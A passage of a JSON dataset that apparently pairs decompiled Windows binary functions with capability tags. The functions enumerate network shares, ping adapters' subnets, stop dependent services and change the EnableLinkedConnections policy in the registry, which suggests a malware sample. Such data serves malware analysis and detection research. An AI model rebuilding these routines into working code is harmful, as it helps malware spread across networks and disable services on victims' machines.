fcn.00417110(*puVar4, uVar5);\n            puVar4 = fcn.004072d0();\n            uVar5 = *puVar4;\n            fcn.00404960();\n            fcn.004171e0(uVar5, arg_ch_00);\n        }\n        fcn.00416e10(uVar1);\n        puVar4 = fcn.004072d0();\n        uVar1 = fcn.004178c0(arg_8h, arg_ch, *puVar4);\n        puVar4 = fcn.00404940();\n        *puVar4 = uVar1;\n    }\n    else if (uVar2 < arg_8h_01) {\n        uVar1 = fcn.00418ca0(arg_8h, uVar2);\n        puVar4 = fcn.004072d0();\n        fcn.00418cc0(arg_8h, uVar1, *puVar4);\n        puVar4 = fcn.00404940();\n        uVar1 = fcn.004178c0(uVar1, arg_ch, *puVar4);\n        puVar4 = fcn.00404940();\n        *puVar4 = uVar1;\n    }\n    else {\n        piVar3 = fcn.004072d0();\n        arg_8h_00 = *piVar3 + arg_8h_01 * 4;\n        puVar4 = fcn.004072d0();\n        fcn.00418cc0(arg_8h, arg_ch, *puVar4);\n        puVar4 = fcn.00404940();\n        fcn.00417110(arg_8h_00, *puVar4);\n        piVar3 = fcn.00404940();\n        *piVar3 = arg_8h_00;\n    }\n    return;\n}\n",
        "token_count": 748
    },
    "00418aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00418aa0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint uVar3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uVar4;\n    uint var_4h;\n    \n    uVar4 = 0x4717c6;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0043a4f7(0xb0, arg_8h_00);\n        if (iVar1 == 0) {\n            var_20h = 0;\n        }\n        else {\n            uVar3 = 0xb0;\n            fcn.00401b10(0xb0);\n            uVar2 = fcn.00401440(arg_ch);\n            var_20h = fcn.00419540(uVar2, uVar3, arg_8h_00, var_34h, var_30h, var_2ch, var_28h, var_24h, var_20h, 1, \n                                   var_18h, var_14h, iVar1, var_ch, uVar4, 0, unaff_EBP, unaff_retaddr, 1, arg_ch, \n                                   in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                                   in_stack_0000001c, in_stack_00000020);\n        }\n    }\n    else if (arg_8h == 2) {\n        iVar1 = fcn.0043a4f7(0xa8, arg_8h_00);\n        if (iVar1 == 0) {\n            var_24h = 0;\n            var_20h = var_24h;\n        }\n        else {\n            fcn.00401b10(0xa8);\n            uVar4 = fcn.00401440(arg_ch);\n            var_20h = fcn.00419640(uVar4);\n        }\n    }\n    else {\n        iVar1 = fcn.0043a4f7(0xb0, arg_8h_00);\n        if (iVar1 == 0) {\n            var_28h = 0;\n            var_20h = var_28h;\n        }\n        else {\n            uVar3 = 0xb0;\n            fcn.00401b10(0xb0);\n            uVar2 = fcn.00401440(arg_ch);\n            var_20h = fcn.00419670(uVar2, uVar3, arg_8h_00, var_34h, var_30h, var_2ch, var_28h, var_24h, var_20h, arg_8h\n                                   , iVar1, var_14h, var_10h, var_ch, uVar4, 2, unaff_EBP, unaff_retaddr, arg_8h, arg_ch\n                                   , in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                                   in_stack_0000001c, in_stack_00000020);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return var_20h;\n}\n",
        "token_count": 1112
    },
    "00419310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419310(int32_t *param_1)\n\n{\n    uint *puVar1;\n    uint var_20h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if ((*param_1 == 0) || (*(param_1 + 1) == '\\0')) {\n        puVar1 = fcn.00411e00(&var_ch, 1);\n        fcn.00411fc0(*puVar1, puVar1[1]);\n        fcn.00451487(&var_20h, 0x48f4e4);\n    }\n    fcn.00412210();\n    *(var_4h + 1) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "004193a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004193a0(int32_t *param_1)\n\n{\n    uint *puVar1;\n    uint var_3ch;\n    uint var_28h;\n    uint var_14h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (*param_1 == 0) {\n        puVar1 = fcn.00411e00(&var_ch, 1);\n        fcn.00411fc0(*puVar1, puVar1[1]);\n        fcn.00451487(&var_28h, 0x48f4e4);\n    }\n    if (*(var_4h + 1) != '\\0') {\n        puVar1 = fcn.00411e00(&var_14h, 0x24);\n        fcn.00411fc0(*puVar1, puVar1[1]);\n        fcn.00451487(&var_3ch, 0x48f4e4);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0041a220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a220(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47196f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00406250(uVar1);\n    *(iVar2 + 8) = 0;\n    iVar2 = fcn.00406250();\n    *(iVar2 + 9) = 0;\n    uVar3 = 0;\n    fcn.00406250();\n    fcn.004264cf();\n    iVar2 = fcn.0043a4f7(0x10, uVar3);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        var_18h = 0;\n    }\n    else {\n        uVar3 = fcn.00402930();\n        var_18h = fcn.0041a830(uVar3, arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.00406250(var_18h, 0);\n    fcn.00414ac0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 367
    },
    "0041a2f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a2f0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47196f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00406250(uVar1);\n    *(iVar2 + 8) = 0;\n    iVar2 = fcn.00406250();\n    *(iVar2 + 9) = 0;\n    uVar3 = 0;\n    fcn.00406250();\n    fcn.004264cf();\n    iVar2 = fcn.0043a4f7(0x10, uVar3);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        var_18h = 0;\n    }\n    else {\n        uVar3 = fcn.00402930();\n        var_18h = fcn.0041a620(uVar3, arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.00406250(var_18h, 0);\n    fcn.00414ac0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 369
    },
    "0041b1a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b1a0(uint arg_8h, uint hKey, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint *puVar5;\n    uint var_34h;\n    uint var_30h;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471a30;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    fcn.004057c0();\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            uVar2 = fcn.00405220(0, 0xf003f, &hKey);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(hKey, uVar2);\n            if (iVar3 == 0) {\n                var_18h = 1;\n                var_14h = 0x104;\n                fcn.004051d0(0x104, 0);\n                puVar5 = &var_14h;\n                uVar4 = 0;\n                uVar2 = fcn.00405270(0);\n                uVar2 = fcn.00405220(0, &var_18h, uVar2, uVar4, puVar5);\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, uVar2);\n                if (iVar3 == 0) {\n                    fcn.004051d0(var_14h, 0);\n                    fcn.0041b380();\n                }\n                else {\n                    fcn.0041b3b0();\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n    }\n    uVar2 = fcn.00401440(&var_30h);\n    fcn.004056d0(uVar2);\n    fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 607
    },
    "0041b2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041b2d0(uint hKey, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = false;\n    uVar1 = fcn.00404d10();\n    uVar1 = uVar1 & 0xff;\n    if (((uVar1 == 0) && (uVar1 = fcn.00404d10(),  (uVar1 & 0xff) == 0)) &&\n       (uVar1 = fcn.00404d10(),  (uVar1 & 0xff) == 0)) {\n        uVar2 = fcn.00405220(&hKey);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(hKey, uVar2);\n        if (uVar1 == 0) {\n            uVar2 = fcn.00404d90();\n            uVar2 = fcn.00405220(uVar2);\n            uVar2 = fcn.00405220(0, 1, uVar2);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, uVar2);\n            var_1h._0_1_ = iVar3 == 0;\n            uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n    }\n    return uVar1 & 0xffffff00 | var_1h._0_1_;\n}\n",
        "token_count": 399
    },
    "0041b7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b7b0(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch;\n    uint arg_8h_00;\n    uint var_64h;\n    uint var_4ch;\n    uint *var_45h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470350;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0xc;\n    var_10h = uVar2;\n    fcn.00401b10(0xc);\n    fcn.00404a90(arg_8h_00, uVar2);\n    var_45h._0_1_ = 0;\n    var_3ch = 0x288;\n    var_40h = fcn.00455a3e(0x288);\n    if (var_40h == NULL) {\n        uVar3 = fcn.00401440(&var_20h);\n        fcn.00404a10(uVar3);\n        fcn.004049d0();\n    }\n    else {\n        iVar4 = (*_sym.imp.IPHLPAPI.DLL_GetAdaptersInfo)(var_40h, &var_3ch);\n        if (iVar4 == 0x6f) {\n            fcn.004557fb(var_40h);\n            var_40h = fcn.00455a3e(var_3ch);\n            if (var_40h == NULL) {\n                uVar3 = fcn.00401440(&var_20h);\n                fcn.00404a10(uVar3);\n                fcn.004049d0();\n                goto code_r0x0041b940;\n            }\n        }\n        iVar4 = (*_sym.imp.IPHLPAPI.DLL_GetAdaptersInfo)(var_40h, &var_3ch);\n        if (iVar4 == 0) {\n            stack0xffffffb8 = var_40h;\n            while (stack0xffffffb8 != NULL) {\n                fcn.00405750(stack0xffffffb8 + 0x6c);\n                fcn.0041b960(&var_38h, &var_64h);\n                fcn.004055f0();\n                arg_ch = 1000;\n                uVar3 = fcn.00401440(&var_38h);\n                cVar1 = fcn.0041b9e0(uVar3, arg_ch);\n                if (cVar1 != '\\0') {\n                    fcn.0041b6c0(&var_38h);\n                }\n                unique0x00007a00 = *stack0xffffffb8;\n                fcn.00404f30();\n            }\n        }\n        fcn.004557fb(var_40h);\n        uVar3 = fcn.00401440(&var_20h);\n        fcn.00404a10(uVar3);\n        fcn.004049d0();\n    }\ncode_r0x0041b940:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 813
    },
    "0041b9e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b9e0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_8h_00;\n    uint *in_stack_ffffffb0;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_20h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        in_stack_ffffffb0 = &var_20h;\n        fcn.0041bb20(in_stack_ffffffb0, uVar2);\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            uVar2 = fcn.00405220();\n            iVar3 = (*_sym.imp.WS2_32.dll_inet_addr)(uVar2);\n            if ((iVar3 != -1) && (iVar4 = (*_sym.imp.IPHLPAPI.DLL_IcmpCreateFile)(),  iVar4 != -1)) {\n                var_5h = *0x48235f;\n                arg_8h_00 = fcn.00455a3e(0x1d);\n                if (arg_8h_00 != 0) {\n                    (*_sym.imp.IPHLPAPI.DLL_IcmpSendEcho)(iVar4, iVar3, &var_5h, 1, 0, arg_8h_00, 0x1d, arg_ch);\n                    (*_sym.imp.IPHLPAPI.DLL_IcmpCloseHandle)(iVar4);\n                    fcn.004557fb(arg_8h_00);\n                    fcn.004055f0();\n                    goto code_r0x0041bb03;\n                }\n                (*_sym.imp.IPHLPAPI.DLL_IcmpCloseHandle)(iVar4);\n            }\n        }\n        fcn.004055f0();\n    }\ncode_r0x0041bb03:\n    fcn.0043a2e7(in_stack_ffffffb0);\n    return;\n}\n",
        "token_count": 550
    },
    "0041bbb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bbb0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint arg_10h;\n    uint *arg_10h_00;\n    uint arg_10h_01;\n    uint arg_8h_00;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ch;\n    uint var_54h;\n    uint *var_50h;\n    uint32_t var_4ch;\n    int32_t var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471a90;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0xc;\n    var_10h = uVar2;\n    fcn.00401b10(0xc);\n    fcn.00404a90(arg_8h_00, uVar2);\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        var_44h = NULL;\n        var_48h = 0;\n        var_14h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        do {\n            uVar3 = fcn.00404db0(1, &var_44h, 0xffffffff, &var_14h, &var_1ch, &var_18h);\n            var_48h = (*_sym.imp.NETAPI32.dll_NetShareEnum)(uVar3);\n            if ((var_48h == 0) || (var_48h == 0xea)) {\n                var_50h = var_44h;\n                for (var_4ch = 1; var_4ch <= var_14h; var_4ch = var_4ch + 1) {\n                    fcn.00405090(*var_50h);\n                    iVar4 = fcn.0041bda0(0x485c34, 0);\n                    if (iVar4 == -1) {\n                        arg_10h_01 = 0x485c38;\n                        arg_10h_00 = &var_40h;\n                        arg_10h = 0x485c3c;\n                        uVar3 = fcn.0041bee0(&var_b4h, 0x485c40, arg_ch);\n                        uVar3 = fcn.004079b0(&var_9ch, uVar3, arg_10h);\n                        uVar3 = fcn.0041bff0(&var_84h, uVar3, arg_10h_00);\n                        uVar3 = fcn.004079b0(&var_6ch, uVar3, arg_10h_01);\n                        fcn.004037a0(uVar3);\n                        fcn.00404f30();\n                        fcn.00404f30();\n                        fcn.00404f30();\n                        fcn.00404f30();\n                    }\n                    var_50h = var_50h + 3;\n                    fcn.00404f30();\n                }\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_44h);\n            }\n        } while (var_48h == 0xea);\n    }\n    uVar3 = fcn.00401440(&var_28h);\n    fcn.00404a10(uVar3);\n    fcn.004049d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 926
    },
    "0041be30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041be68)\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0041be30(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint arg_10h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0041be20(&var_30h);\n    arg_8h_01 = fcn.0041c310(arg_8h_00, arg_ch);\n    arg_10h = fcn.00402930(0);\n    fcn.0041c280(arg_8h_01, arg_8h_00, arg_10h);\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 252
    },
    "0041c310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041c320)\n// WARNING: Removing unreachable block (ram,0x0041c350)\n// WARNING: Removing unreachable block (ram,0x0041c347)\n// WARNING: Removing unreachable block (ram,0x0041c385)\n// WARNING: Removing unreachable block (ram,0x0041c31a)\n\nint16_t * __cdecl fcn.0041c310(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_ch;\n    do {\n        arg_8h = arg_8h + -1;\n        *arg_8h = var_4h % 10 + 0x30;\n        var_4h = var_4h / 10;\n    } while (var_4h != 0);\n    return arg_8h;\n}\n",
        "token_count": 213
    },
    "0041c5b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpServiceName\n\nvoid __cdecl fcn.0041c5b0(uint hSCManager, int32_t hService, uint32_t dwMilliseconds)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint lpServiceName;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    int32_t lpServices;\n    uint pcbBytesNeeded;\n    uint lpServiceStatus;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t lpServicesReturned;\n    uint32_t var_1ch;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    pcStack16 = fcn.0047009a;\n    var_10h = *in_FS_OFFSET;\n    var_8h = *0x49106c ^ 0x48c010;\n    var_1ch = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_10h;\n    if (hService != 0) {\n        pcbBytesNeeded = 0;\n        lpServicesReturned = 0;\n        lpServices = 0;\n        lpServiceStatus = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_38h = 0;\n        var_34h = 0;\n        var_30h = 0;\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_58h = (*_sym.imp.KERNEL32.dll_GetTickCount)(var_1ch);\n        iVar1 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesW)\n                          (hService, 1, lpServices, 0, &pcbBytesNeeded, &lpServicesReturned);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0xea)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, pcbBytesNeeded);\n            lpServices = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpServices != 0) {\n                var_4h = 0;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesW)\n                                  (hService, 1, lpServices, pcbBytesNeeded, &pcbBytesNeeded, &lpServicesReturned);\n                if (iVar1 != 0) {\n                    for (var_50h = 0; var_50h < lpServicesReturned; var_50h = var_50h + 1) {\n                        puVar3 = var_50h * 0x24 + lpServices;\n                        puVar4 = &lpServiceName;\n                        for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n                            *puVar4 = *puVar3;\n                            puVar3 = puVar3 + 1;\n                            puVar4 = puVar4 + 1;\n                        }\n                        var_54h = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(hSCManager, lpServiceName, 0x24);\n                        if (var_54h == 0) break;\n                        var_4h = 1;\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_ControlService)(var_54h, 1, &lpServiceStatus);\n                        if (iVar1 != 0) {\n                            while (var_40h != 1) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)\n                                                  (var_54h, 0, &lpServiceStatus, 0x24, &pcbBytesNeeded);\n                                if (((iVar1 == 0) || (var_40h == 1)) ||\n                                   (iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)(),  dwMilliseconds < iVar1 - var_58h))\n                                break;\n                            }\n                        }\n                        var_4h = 0;\n                        fcn.0041c771();\n                    }\n                }\n                var_4h = 0xfffffffe;\n                fcn.0041c78f();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    fcn.0043a2e7(lpServiceName);\n    return;\n}\n",
        "token_count": 1087
    },
    "0041c7d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c7d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hKey;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    if (arg_8h == '\\0') {\n        arg_8h_00 = 0x80000002;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                          (0x80000002, L\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\", 0, 0xf003f, \n                           &var_10h);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(var_10h, L\"EnableLinkedConnections\");\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_10h);\n        }\n    }\n    else {\n        arg_8h_00 = 0x80000002;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, 0x485ef8, 0, 0xf003f, &hKey);\n        if (iVar1 == 0) {\n            var_8h = 1;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, 0x485f6c, 0, 4, &var_8h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 416
    },
    "0041c890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
